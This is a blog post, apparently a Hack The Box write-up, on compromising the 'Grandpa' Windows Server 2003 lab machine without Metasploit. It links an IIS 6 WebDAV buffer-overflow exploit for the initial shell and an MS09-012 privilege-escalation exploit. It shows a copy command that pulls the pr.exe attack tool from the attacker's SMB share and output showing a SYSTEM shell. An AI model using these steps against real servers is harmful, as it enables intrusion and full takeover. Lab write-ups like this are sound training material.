---
layout: post
title: Grandpa without metasploit
date: 2020-03-31
author: th3-3inst3in
comments: true
categories: htb
tags: [Windows,htb]
---

## Grandpa without metasploit

So I thought time to shift focus from metasploit and try to do machines without metasploit. I'll admit it took wayy longer and many many failed attempts before I finally got root. Hope ya'll learn some new tricks form this writeup

![main]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Grandpa/main.png)


Let's do a quick nmap all ports

```perl

Nmap scan report for 10.10.10.14
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Fri, 03 Apr 2020 18:34:04 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

<br>

### Enumeration

- So I search for IIS 6 vulnerabilites and mainly found 2 things 
- 1) Web Dav exploit
- 2) The BufferOver flow exploit, since I used the webdav one in granny htb machine, thought I'd try buffer over flow so I found an exploit for it on github.
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell  



![LFI]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Beep/lfi.png)



### Exploitation


Using the iis6 buffer overflow exploit I got an inital shell on the Windows box

![initial shell]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Grandpa/shell1.png)


Now I won't lie Priv esec was a bitch, took hours. What I am presenting here is the final version of what happened but originally I hit many dead ends and restarted the machine about 10 times or more.

- So started off using Windows Exploit suggester which requires us to save the systeminfo in a text file and feed that as an arguments to find known exploits for that version of the OS.


```perl
sysinfo 
C:\wmpub\test>systeminfo 
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 11 Minutes, 18 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 796 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,327 MB
Page File: In Use:         143 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```

![Windows exploit suggester]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Grandpa/exploit-suggest.png)


- after many a failed exploits I finally found MS09-012 and it worked landing me in a system shell
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012  

- Downloaded the pr.exe file and transfered it to the victim using impacket smbserver

- the smb share can easily be accessed using copy command from the prompt 

_Prompt> copy \\<IP>\test\pr.exe ._


![smbserver]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Grandpa/smbserver.png)



- after copied on the victim it can be used as follows : pr.exe "command"

```perl
C:\wmpub\test>copy \\10.10.14.18\test\pr.exe .    
copy \\10.10.14.18\test\pr.exe .
        1 file(s) copied.

C:\wmpub\test>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\wmpub\test

04/04/2020  10:48 AM    <DIR>          .
04/04/2020  10:48 AM    <DIR>          ..
04/04/2020  10:42 AM            73,728 pr.exe
               1 File(s)         73,728 bytes
               2 Dir(s)  18,093,436,928 bytes free

C:\wmpub\test>pr.exe "whoami"
pr.exe "whoami"
/xxoo/-->Build&&Change By p 
/xxoo/-->This exploit gives you a Local System shell 
/xxoo/-->Got WMI process Pid: 1864 
begin to try
/xxoo/-->Found token SYSTEM 
/xxoo/-->Command:whoami
nt authority\system

C:\wmpub\test>whoami
whoami
nt authority\network service

C:\wmpub\test>

```




![system]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Grandpa/system.png)

phew! we otta do more of these non msf ctfs.